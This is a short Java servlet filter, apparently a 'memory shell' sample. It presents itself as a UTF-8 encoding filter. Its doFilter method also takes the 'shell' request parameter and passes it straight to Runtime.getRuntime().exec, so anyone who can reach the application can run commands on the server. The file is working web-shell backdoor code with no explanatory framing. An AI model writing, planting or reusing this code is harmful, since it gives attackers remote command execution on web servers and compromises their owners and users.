package filter;

import javax.servlet.*;
import java.io.IOException;

public class FilterMem implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("初始加完成");
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        servletRequest.setCharacterEncoding("utf-8");
        servletResponse.setCharacterEncoding("utf-8");
        servletResponse.setContentType("text/html;charset=UTF-8");
        filterChain.doFilter(servletRequest,servletResponse);
        System.out.println(servletRequest.getParameter("shell"));
        Runtime.getRuntime().exec(servletRequest.getParameter("shell"));
        System.out.println("过滤中。。。");
    }

    @Override
    public void destroy() {
        System.out.println("过滤结束");
    }
}